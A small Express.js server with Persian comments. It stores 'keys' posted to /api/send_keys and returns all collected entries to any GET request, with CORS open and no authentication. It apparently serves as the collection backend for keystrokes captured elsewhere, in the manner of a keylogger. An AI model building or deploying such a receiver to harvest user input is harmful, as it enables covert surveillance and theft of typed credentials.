const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname))); // نمایش index.html

let keysData = [];

// Endpoint برای ذخیره داده‌ها
app.post("/api/send_keys", (req, res) => {
  const { keys } = req.body;
  if (keys) keysData.push(keys);
  res.json({ status: "ok" });
});

// Endpoint برای خواندن داده‌ها
app.get("/api/send_keys", (req, res) => {
  res.json(keysData);
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
